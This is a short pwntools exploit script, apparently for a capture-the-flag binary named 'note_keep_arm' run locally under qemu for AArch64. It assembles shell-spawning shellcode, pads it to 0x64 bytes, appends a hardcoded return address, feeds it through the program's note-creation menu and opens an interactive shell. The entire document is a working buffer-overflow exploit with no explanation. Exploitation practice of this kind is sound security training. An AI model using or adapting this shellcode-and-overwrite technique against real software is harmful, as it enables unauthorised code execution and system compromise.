from pwn import *
context.binary = elf = ELF("./note_keep_arm")

p = process("qemu-aarch64 -L /usr/aarch64-linux-gnu -g 1234 ./note_keep_arm".split()) 
context.log_level = 'debug' 
input('Debug')

info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

def create(id, payload):
        sla(b"Quit\n", "1")
        sla(b"ID:\n", str(id).encode())
        sla(b"e:\n", payload)
# 
payload = asm(shellcraft.aarch64.linux.sh())
payload = payload.ljust(0x64)
payload += p64(0x550001201c)
create(0x007b0000, payload)
p.interactive()